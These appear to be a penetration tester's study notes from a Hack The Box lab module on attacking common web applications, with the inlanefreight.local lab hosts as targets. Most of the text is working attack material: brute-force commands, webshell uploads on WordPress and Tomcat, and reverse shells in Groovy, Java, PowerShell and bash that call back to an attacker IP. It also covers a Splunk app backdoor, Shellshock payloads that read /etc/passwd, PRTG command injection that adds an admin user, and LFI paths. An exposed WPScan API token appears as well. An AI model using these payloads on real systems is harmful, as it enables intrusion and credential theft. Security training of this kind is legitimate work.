# Notes - Attacking common applications

## Discovery

These are the addresses of machines/services within our scope:
```
app.inlanefreight.local
dev.inlanefreight.local
drupal-dev.inlanefreight.local
drupal-qa.inlanefreight.local
drupal-acc.inlanefreight.local
drupal.inlanefreight.local
blog-dev.inlanefreight.local
blog.inlanefreight.local
app-dev.inlanefreight.local
jenkins-dev.inlanefreight.local
jenkins.inlanefreight.local
web01.inlanefreight.local
gitlab-dev.inlanefreight.local
gitlab.inlanefreight.local
support-dev.inlanefreight.local
support.inlanefreight.local
inlanefreight.local
10.129.201.50
```

We can scan these targets with nmap for the most common web-app ports:
```
sudo  nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list 
```

For the discoverd services we can automate the screenshot (and default cred test) with `eyewitness`. It can take the output of nmap/Nessus to start the information gathering process:

```
eyewitness --web -x web_discovery.xml -d inlanefreight_eyewitness
```

Creating a report with aquatone:
```
cat web_discovery.xml | ./aquatone -nmap
```
## Wordpress


Attempt to check version used by a sumple curl and grep
```
curl -s http://blog.inlanefreight.local | grep WordPress
```
Identify the theme used:
```
curl -s http://blog.inlanefreight.local/ | grep themes
```
List the used plugins:
```
curl -s http://blog.inlanefreight.local/ | grep plugins
```

However we can use automated tools for wordpress enumeration:
```
sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token QpIaxUlf8zLbDBi626wVEtZH3Rg4gnih2EAq5jQx8uo
```

We can try brute forcing passwords on the found users:
```
sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
```

Once we have admin credentials for wordpress we can change php code in one of the themes to add a webshell
![image](theme_editor.png)

One modified we can invoke system cpmmands with curl:
```
curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id
```

We can also use metasploit too upload a shell:
```
use exploit/unix/webapp/wp_admin_shell_upload 

[*] No payload configured, defaulting to php/meterpreter/reverse_tcp

msf6 exploit(unix/webapp/wp_admin_shell_upload) > set username john
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set password firebird1
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set lhost 10.10.14.15 
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rhost 10.129.42.195  
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set VHOST blog.inlanefreight.local
```

# Joomla

A rudimentary fingerprinting technique is:
```
curl -s http://dev.inlanefreight.local/ | grep Joomla
```

Getting the version:
```
curl -s http://dev.inlanefreight.local/README.txt | head -n 5
OR
curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format -
```

Brute forcing a login:
```
sudo python3 joomla-brute.py -u http://app.inlanefreight.local -w /usr/share/wordlists/metasploit/http_default_pass.txt -usr admin
```

# Drupal

Basic footprinting of a drupal site:
```
curl -s http://drupal.inlanefreight.local | grep Drupal
```

Enumerating the version using changelog:
```
curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 ""
```

Automatic enumeration is possible with droopescan:
```
droopescan scan drupal -u http://drupal.inlanefreight.local
```

Most notable expoits are the three drupalgeddon exploits....
```
python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd
```

# Tomcat

Determining if the webserver is tomcat can be done via browsing an non-existen url. The error page show it is tomcat (or not)

Another possible way via curl is:
```
curl -s http://app-dev.inlanefreight.local:8080/docs/ | grep Tomcat 
```


We can brute force the Tomcat admin login with metasploit:
```
use auxiliary/scanner/http/tomcat_mgr_login
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set VHOST web01.inlanefreight.local
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RPORT 8180
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set stop_on_success true
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set rhosts 10.129.201.58
```

Once we obtain Tomcat credentials with manager-gui privileges we can upload a web shell.
The JSP rev shell can be found here: https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp

We then need to packge it in a war file like this:
```
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
zip -r backup.war cmd.jsp 
```

Then upload it to tomcat... Next we can invoke a command:
```
curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id
```

We can also create the rev shell with msfvenom:
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war
```

A notable exploit is the `CVE-2020-1938 : Ghostcat` when is an LFI exploit.
We can check if the target is vunerable by checking if the AJP protocol is enabled:
```
nmap -sV -p 8009,8080 app-dev.inlanefreight.local

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-21 20:05 EDT
Nmap scan report for app-dev.inlanefreight.local (10.129.201.58)
Host is up (0.14s latency).

PORT     STATE SERVICE VERSION
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
8080/tcp open  http    Apache Tomcat 9.0.30

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.36 seconds
```

If it is we can use this script:
```
python2.7 tomcat-ajp.lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.xml 
```

# Jenkins

One we obtain admin credentials we can exploit the script console where we can run system commands via Groovy scripts (Linux):
```
def cmd = 'id'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
```

Or a reverse shell:
```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

(Windows)
```
def cmd = "cmd.exe /c dir".execute();
println("${cmd.text}");
```

Or a reverse shell:
```
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

# Splunk

We can create a splunk package to get a reverse shell... A package has this structure:
```
splunk_shell/
├── bin
└── default
```

In the bin folder we can put a powershell script (reverse shell):
```powershell
#A simple and small reverse shell. Options and help removed to save space. 
#Uncomment and change the hardcoded IP address and port number in the below line. Remove all help comments as well.
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.15',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

Then we need to configure the `inputs.conf` file too run a bat file every 10 seconds:
```conf
[script://./bin/rev.py]
disabled = 0  
interval = 10  
sourcetype = shell 

[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10
```
The `run.bat` is essentially a wrapper to invoke the powershell rev shell.
```
@ECHO OFF
PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
Exit
```
Next we create a tarball from the structure:
```
tar -cvzf updater.tar.gz splunk_shell/

splunk_shell/
splunk_shell/bin/
splunk_shell/bin/rev.py
splunk_shell/bin/run.bat
splunk_shell/bin/run.ps1
splunk_shell/default/
splunk_shell/default/inputs.conf
```

Then we can `Install app from file`

# Prtg network monitoring

Version 17.3.33.283 suffers from a cmd injection vulnerablity,  by adding a notification we can run this command whhich adds an admin user:
```
test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add
```
# Gitlab

User enumeration.. 
A shell script (https://www.exploit-db.com/exploits/49821 or https://github.com/dpgg101/GitLabUserEnum) has been developed to enumerate users, which can be uses like this:

```bash
./gitlab_userenum.sh --url http://gitlab.inlanefreight.local:8081/ --userlist users.txt
```

An authenticated remote code execution vulnerability exists (https://www.exploit-db.com/exploits/49951):
```
python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f '
```

# Tomcat CGI

Confirming if a cgi script exists on the tomcat server can be done with ffufs:
```
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd
```
In case of a bat file running on the server:
```
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat
```

Running whoami on a discover bat file:
```
curl 'http://10.129.205.30:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe'
```

In case the CGI script is a bash script it can be vunerable to shell shock in case of an old bash version...

We can first find such scripts (typically in the cgi-bin folder):
```
gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
```

One we have located one we can exploit it like this

Dump `passwd` file
```
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.204.231/cgi-bin/access.cgi
```

Get a reverse shell:
```
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.15.237/7777 0>&1' http://10.129.205.27/cgi-bin/access.cgi
```

# Thick client

See https://academy.hackthebox.com/module/113/section/2139 to find out how to find hardcoded credentials in a binary

# Tick client external communication

See https://academy.hackthebox.com/module/113/section/2164

# Coldfusion

An LFI attack whcih sometimes works on coldfusion servers is:
```
http://example.com/index.cfm?directory=../../../etc/&file=passwd

OR 

http://www.example.com/CFIDE/administrator/settings/mappings.cfm?locale=../../../../../etc/passwd

OR 

python2 14641.py 10.129.204.230 8500 "../../../../../../../../ColdFusion8/lib/password.properties"
```
An RCE exploit also exists:
```
cp /usr/share/exploitdb/exploits/cfm/webapps/50057.py .
python3 50057.py 
```


# IIS 

short filename enumeration can be done with the tool found here:
```
https://github.com/irsdl/IIS-ShortName-Scanner/tree/master/release
```

We can start the scanning with:
```
java -jar iis_shortname_scanner.jar 0 5 http://10.129.204.231/
```

This might uncover short filenames, we can now create custom word lists using this start.


# LDAP

We can query an ldap server with `ldapsearch`:
```
ldapsearch -H ldap://ldap.example.com:389 -D "cn=admin,dc=example,dc=com" -w secret123 -b "ou=people,dc=example,dc=com" "(mail=john.doe@example.com)"
```

Sometimes if user input is not properly sanatized it can lead to authentication bypasses. For example we can try injecting "*" in the username/password field to check if we can bypass auth.

# Web mass assignment vulnerabilities

see https://academy.hackthebox.com/module/113/section/2160

# Attacking applications connecting to services

If a binary is found which connects to an external API we can attempt to disassemble it with gdb and find the point where it jumps to authenticate to the external server (SQL server for instance)... We can then dump the arguments passed to the function which could contain sensitive data

See https://academy.hackthebox.com/module/113/section/2154

If we identify the application as a DOT Net application we can use dnsSpy to decompile it and check if sensitive data is in the binary.



